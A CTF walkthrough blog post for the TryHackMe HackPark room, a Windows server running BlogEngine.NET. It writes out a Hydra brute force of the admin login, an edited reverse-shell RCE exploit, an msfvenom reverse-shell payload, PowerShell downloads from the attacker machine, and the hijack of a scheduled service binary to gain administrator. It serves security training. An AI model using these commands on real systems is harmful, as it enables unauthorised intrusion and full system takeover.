---
title: "Walk-through of HackPark from TryHackMe"
header:
  teaser: /assets/images/2021-02-01-22-45-46.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - THM
  - CTF
  - Windows
  - Winpeas
  - RCE
---

## Machine Information

![hackpark](/assets/images/2021-02-01-22-45-46.png)

HackPark is a medium difficulty room on TryHackMe. Running on Windows 2012 R2 Server, this room covers brute forcing a web applications admin credentials. From there we use a known exploit to gain an initial shell. Then we enumerate the machine to find installed software which also has known exploits, we then use this to escalate to administrator.

 Skills required are knowledge enumerating ports, services and file systems. Skills learned are using Hydra to brute force a web application, and researching exploits to use on discovered vulnerabilities.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [TryHackMe](https://tryhackme.com/) |
| Link To Machine | [THM - Medium - HackPark](https://tryhackme.com/room/hackpark) |
| Machine Release Date |6th August 2019 |
| Date I Completed It | 1st February 2021 |
| Distribution Used | Kali 2020.3 – [Release Info](https://www.kali.org/releases/kali-linux-2020-3-release/) |

## Initial Recon

As always, let's start with Nmap to check for open ports:

```text
kali@kali:~/thm/hackpark$ nmap -sC -sV -Pn 10.10.60.43

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-30 16:06 GMT
Nmap scan report for 10.10.60.43
Host is up (0.033s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2020-10-01T21:12:23
|_Not valid after:  2021-04-02T21:12:23
|_ssl-date: 2021-01-30T16:07:21+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Just a couple open, let's try port 80 first:

![hackpark-webhome](/assets/images/2021-01-30-16-10-04.png)

## Task 1

We find a basic [BlogEngine](https://blogengine.io/) based site with a single post. The clown will be familiar to any one who has seen [Stephen King's IT](https://www.imdb.com/title/tt0099864/).

A quote from IMDB helps with the first question:

```text
The most striking thing about the film was Tim Curry's iconic, creepy performance as Pennywise, the murderous clown.
```

Looking around we find just one post created by the user Administrator. Hovering over that link shows us a potential user name of Admin:

![hackpark-adminuser](/assets/images/2021-01-30-16-39-43.png)

Top right of the page we find a drop down menu which links us to a login page:

![hackpark-weblogin](/assets/images/2021-01-30-16-32-22.png)

## Task 2

We fire up BurpSuite to analyze the traffic, then attempt to login in with username admin and password admin:

![hackpark-failedlogin](/assets/images/2021-01-30-17-00-13.png)

The login failed but we captured the traffic in Burp:

![hackpark-post](/assets/images/2021-01-30-16-30-29.png)

We can see the request was a POST which helps with task 2. We can also see the data that was sent in the login request in the __VIEWSTATE= section at the bottom.

Using what we now know we can try to brute force our way in using Hydra:

```text
kali@kali:~/thm/hackpark$ hydra -v -l admin -P /usr/share/wordlists/rockyou.txt 10.10.60.43 http-post-form "/Account/login.aspx:__VIEWSTATE=v2%2FpJf5g0ju42LmZjbFdycrJfqFRSYkfOeJv79XeFKiaHtyhjCJjBQm1e9%2FRbOLxqHnKaQArzfzFSAs%2BB5yFhKneHbgLcTy2s9BkQahPVGqJN64Bm5RKsjOGVbzkCjudOIBh%2BfiJAqTbe71eFBWNclsZyPv7QSI67TEU7zwWHapnLQ9K3wyYD0ePtW5g9Iu9u4SWan8B5cB%2Fqq%2FcLP%2FMEXyfeW%2Fgo30FHMuQhhTPj0a%2BOGdWlsUW6l0tIMSnHIb0cMHicQoK8SJ%2BiwqCrr5Tx8gPrSPbJr%2BB%2FZnpS7yo6B%2Frvon2P9GjeUH9v7JnjNhQJdd1ZN4IkXUtHgr667K2i59pL68rQ7qh%2Bvo7fc8tlXSnvp9B&__EVENTVALIDATION=RnYbEyzGTU2QAUGmkxHo4YsUdSsZDJuXW6HD97WnUyh0jLqmpusHutkSu1kwFAQ8ngHp89xLzPrswQvsP%2BaggtUD5JbMnL2WJVHdDOySSuHq0jKT6IeISlH2JhdbV1SaS4wji37q96RuvkTbQpBS%2BEh9JSd%2FmnhA64WN1sQaG0X4Zon6&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

In the above we have the used the following:

```text
Username = admin
Wordlist for passwords = rockyou.txt
IP of the target server = 10.10.60.43
Type of attack = http-post-form
Page to attack = /account/login.aspx
Session info gathered from Burp = __VIEWSTATE=v2%2FpJf5g0ju42LmZjbFdycrJfqFRSYkfOeJv79XeFKiaHtyhjCJjBQm1e9%2FRbOLxqHnKaQArzfzFSAs%2BB5yFhKneHbgLcTy2s9BkQahPVGqJN64Bm5RKsjOGVbzkCjudOIBh%2BfiJAqTbe71eFBWNclsZyPv7QSI67TEU7zwWHapnLQ9K3wyYD0ePtW5g9Iu9u4SWan8B5cB%2Fqq%2FcLP%2FMEXyfeW%2Fgo30FHMuQhhTPj0a%2BOGdWlsUW6l0tIMSnHIb0cMHicQoK8SJ%2BiwqCrr5Tx8gPrSPbJr%2BB%2FZnpS7yo6B%2Frvon2P9GjeUH9v7JnjNhQJdd1ZN4IkXUtHgr667K2i59pL68rQ7qh%2Bvo7fc8tlXSnvp9B&__EVENTVALIDATION=RnYbEyzGTU2QAUGmkxHo4YsUdSsZDJuXW6HD97WnUyh0jLqmpusHutkSu1kwFAQ8ngHp89xLzPrswQvsP%2BaggtUD5JbMnL2WJVHdDOySSuHq0jKT6IeISlH2JhdbV1SaS4wji37q96RuvkTbQpBS%2BEh9JSd%2FmnhA64WN1sQaG0X4Zon6&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
Failed login message so we can detect when we have a success = :Login Failed
```

Hydra gets to work trying each password from the wordlist and quickly finds the correct one:

```text
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-30 16:47:47
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.60.43:80/Account/login.aspx:__VIEWSTATE=v2%2FpJf5g0ju42LmZjbFdycrJfqFRSYkfOeJv79XeFKiaHtyhjCJjBQm1e9%2FRbOLxqHnKaQArzfzFSAs%2BB5yFhKneHbgLcTy2s9BkQahPVGqJN64Bm5RKsjOGVbzkCjudOIBh%2BfiJAqTbe71eFBWNclsZyPv7QSI67TEU7zwWHapnLQ9K3wyYD0ePtW5g9Iu9u4SWan8B5cB%2Fqq%2FcLP%2FMEXyfeW%2Fgo30FHMuQhhTPj0a%2BOGdWlsUW6l0tIMSnHIb0cMHicQoK8SJ%2BiwqCrr5Tx8gPrSPbJr%2BB%2FZnpS7yo6B%2Frvon2P9GjeUH9v7JnjNhQJdd1ZN4IkXUtHgr667K2i59pL68rQ7qh%2Bvo7fc8tlXSnvp9B&__EVENTVALIDATION=RnYbEyzGTU2QAUGmkxHo4YsUdSsZDJuXW6HD97WnUyh0jLqmpusHutkSu1kwFAQ8ngHp89xLzPrswQvsP%2BaggtUD5JbMnL2WJVHdDOySSuHq0jKT6IeISlH2JhdbV1SaS4wji37q96RuvkTbQpBS%2BEh9JSd%2FmnhA64WN1sQaG0X4Zon6&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] Page redirected to http://10.10.60.43/
[80][http-post-form] host: 10.10.60.43   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.60.43 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-30 16:48:30
```

## Task 3

We have the user and admin credentials and can login to get to the dashboard:

![hackpark-dashboard](/assets/images/2021-01-30-17-17-49.png)

Clicking on about helps us with task 3:

![hackpark-about](/assets/images/2021-01-30-17-19-14.png)

A look around doesn't present anything immediately obvious, let's check Exploit-DB via searchsploit:

```text
kali@kali:~/thm/hackpark$ searchsploit blogengine
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
BlogEngine 3.3 - 'syndication.axd' XML External Entity Injection                          | xml/webapps/48422.txt
BlogEngine 3.3 - XML External Entity Injection                                            | windows/webapps/46106.txt
BlogEngine 3.3.8 - 'Content' Stored XSS                                                   | aspx/webapps/48999.txt
BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting                                   | asp/webapps/32874.txt
BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                         | asp/webapps/35168.txt
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                        | aspx/webapps/46353.cs
BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution        | aspx/webapps/47010.py
BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal                                   | aspx/webapps/47035.py
BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution   | aspx/webapps/47011.py
BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                | aspx/webapps/47014.py
------------------------------------------------------------------------------------------ ---------------------------------
```

We have what looks to be a possible RCE exploit for our version of BlogEngine:

```text
BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                        | aspx/webapps/46353.cs
```

Let's download it and have a look:

```text
kali@kali:~/thm/hackpark$ searchsploit -m aspx/webapps/46353.cs
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text, with CRLF line terminators
Copied to: /home/kali/46353.cs  
```

Reading the exploit it looks to be fairly simple. We just need to edit this line and put our attack machine IP and port we will have NetCat listening on:

```text
using(System.Net.Sockets.TcpClient client = new System.Net.Sockets.TcpClient("10.10.10.20", 4445)) {
```

Then we go to blog post when logged in as admin and now have an edit option:

![hackpark-editpost](/assets/images/2021-01-30-17-15-51.png)

Click on the file manager button:

![hackparo-upload](/assets/images/2021-01-30-17-14-25.png)

Rename my exploit to Postview.asc and upload:

![hackpark-filemanager](/assets/images/2021-01-30-17-13-45.png)

Now save the updated post:

![hackpark-savepost](/assets/images/2021-01-30-17-15-07.png)

Back on Kali we set a NetCat session listening:

```text
root@kali:/home/kali/thm/hackpark# nc -nlvp 1234
listening on [any] 1234 ...
```

Then as described in the exploit we browse to the URL mentioned:

![hackpark-exploiturl](/assets/images/2021-01-30-17-20-54.png)

When we switch back to NetCat, and we have a connection:

```text
root@kali:/home/kali/thm/hackpark# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.14.6.200] from (UNKNOWN) [10.10.60.43] 49708
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
```

First lets see who we are connected as, which will help with task 3:

```text
c:\windows\system32\inetsrv>whoami
iis apppool\blog
```

## Privilege escalation

For Windows boxes the quickest way to find interesting areas to look further in to is using an enumeration script. A few different ones exist but let's go with winPEAS as described in the room:

```text
kali@kali:~/thm/hackpark$ wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
```

We need a web server running on Kali so we can pull files from it to the HackPark server where we have our initial shell:

```text
kali@kali:~/thm/hackpark$ python3 -m http.server
```

CD in to the temp folder which is writeable by everyone, then use PowerShell to pull winPEAS over:

```text
C:\Windows\temp> PowerShell Invoke-WebRequest -Uri http://10.14.6.200:8000/winPEAS.exe -Outfile winpeas.exe
```

There is a lot of output to go through. Eventually we find this section:

```text
  ========================================(Services Information)========================================
  [+] Interesting Services -non Microsoft-
   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
    Amazon EC2Launch(Amazon Web Services, Inc. - Amazon EC2Launch)["C:\Program Files\Amazon\EC2Launch\EC2Launch.exe" service] - Auto - Stopped
    Amazon EC2Launch
   =================================================================================================
    AmazonSSMAgent(Amazon SSM Agent)["C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"] - Auto - Running
    Amazon SSM Agent
   =================================================================================================
    AWSLiteAgent(Amazon Inc. - AWS Lite Guest Agent)[C:\Program Files\Amazon\XenTools\LiteAgent.exe] - Auto - Running - No quotes and Space detected
    AWS Lite Guest Agent
   =================================================================================================
    Ec2Config(Amazon Web Services, Inc. - Ec2Config)["C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe"] - Auto - Running - isDotNet
    Ec2 Configuration Service
   =================================================================================================
    PsShutdownSvc(Systems Internals - PsShutdown)[C:\Windows\PSSDNSVC.EXE] - Manual - Stopped
   =================================================================================================
    WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
    File Permissions: Everyone [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
    System Scheduler Service Wrapper
   =================================================================================================                      
```

The last one above say possible DLL hijack. That sounds interesting, and we find this on Exploit-DB: [Splinterware System Scheduler Pro 5.12 - Privilege Escalation](https://www.exploit-db.com/exploits/45072)

## Task 4

We see the name of the service running is WindowsScheduler, which helps us with task 4.

Looking in the SystemScheduler folder indicated by winPEAS we see a couple of files with a current date and time, plus a directory called Events:

```text
C:\Program Files (x86)\SystemScheduler>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Program Files (x86)\SystemScheduler
08/04/2019  03:37 AM    <DIR>          .
08/04/2019  03:37 AM    <DIR>          ..
05/17/2007  12:47 PM             1,150 alarmclock.ico
08/31/2003  11:06 AM               766 clock.ico
08/31/2003  11:06 AM            80,856 ding.wav
02/01/2021  02:02 PM    <DIR>          Events
08/04/2019  03:36 AM                60 Forum.url
01/08/2009  07:21 PM         1,637,972 libeay32.dll
11/15/2004  11:16 PM             9,813 License.txt
02/01/2021  01:27 PM             1,496 LogFile.txt
02/01/2021  01:27 PM             3,760 LogfileAdvanced.txt
03/25/2018  09:58 AM           536,992 Message.exe
03/25/2018  09:59 AM           445,344 PlaySound.exe
03/25/2018  09:58 AM            27,040 PlayWAV.exe
```

Checking the files doesn't reveal anything, but looking in the Events directory we see a few more files with current dates and times:

```text
C:\Program Files (x86)\SystemScheduler>cd events
C:\Program Files (x86)\SystemScheduler\Events>dir
 Directory of C:\Program Files (x86)\SystemScheduler\Events
02/01/2021  02:04 PM             1,926 20198415519.INI
02/01/2021  02:04 PM            22,730 20198415519.INI_LOG.txt
10/02/2020  01:50 PM               290 2020102145012.INI
02/01/2021  01:58 PM               186 Administrator.flg
02/01/2021  01:27 PM                 0 Scheduler.flg
```

Looking at the txt file we find a process is stopped and started every 30 seconds by the administrator:

```text
type 20198415519.INI_LOG.txt 
C:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
```

Putting together what we've found so far we can see we have an executable called Message.exe being executed by administrator in a directory that has Everyone [WriteData/CreateFiles] permissions. So our escalation path is clear, we just need to switch Message.exe for our own reverse shell exe.

First let's create a shell using MSFVenom in our webserver folder so we can grab it from the box:

```text
kali@kali:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.6.200 LPORT=1337 -f exe -o Message.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: Message.exe
```

Start a new terminal window and start NetCat listening:

```text
kali@kali:~/thm/hackpark$ nc -nlvp 1337
listening on [any] 1337 ...
```

Now go back to the box and move the existing Message.exe out of the way and pull our reverse shell across to replace it:

```text
C:\Program Files (x86)\SystemScheduler>rename Message.exe Message.old
C:\Program Files (x86)\SystemScheduler>powershell Invoke-WebRequest -Uri http://10.14.6.200:8000/Message.exe -Outfile Message.exe
C:\Program Files (x86)\SystemScheduler>dir
 Directory of C:\Program Files (x86)\SystemScheduler
05/17/2007  12:47 PM             1,150 alarmclock.ico
08/31/2003  11:06 AM               766 clock.ico
08/31/2003  11:06 AM            80,856 ding.wav
02/01/2021  02:16 PM    <DIR>          Events
08/04/2019  03:36 AM                60 Forum.url
01/08/2009  07:21 PM         1,637,972 libeay32.dll
11/15/2004  11:16 PM             9,813 License.txt
02/01/2021  01:27 PM             1,496 LogFile.txt
02/01/2021  01:27 PM             3,760 LogfileAdvanced.txt
02/01/2021  02:17 PM             7,168 Message.exe
03/25/2018  09:58 AM           536,992 Message.old
```

After a small wait we get a connection as root:

```text
kali@kali:~/thm/hackpark$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.14.6.200] from (UNKNOWN) [10.10.81.166] 49523
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\>whoami
hackpark\administrator
```

Now we can get the information needed to complete the questions for the room. Systemsinfo gives us a couple:

```text
C:\systeminfo

Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA886
Original Install Date:     8/3/2019, 10:43:23 AM
System Boot Time:          2/1/2021, 1:26:29 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
```

We can also get the user flag from Jeffs desktop, and the root one from the admin desktop:

```text
C:\>cd users\jeff\desktop
C:\Users\jeff\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Users\jeff\Desktop
08/04/2019  10:57 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  39,121,526,784 bytes free

C:\Users\jeff\Desktop>type user.txt
<<HIDDEN>>

C:\Users\jeff\Desktop>cd ..\..\administrator\desktop
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of C:\Users\Administrator\Desktop
08/04/2019  10:51 AM                32 root.txt
08/04/2019  03:36 AM             1,029 System Scheduler.lnk
               2 File(s)          1,061 bytes
               2 Dir(s)  39,121,526,784 bytes free

C:\Users\Administrator\Desktop>type root.txt
<<HIDDEN>>
```

Hopefully you enjoyed this fun room as much as I did!

For now we are all done. See you next time.
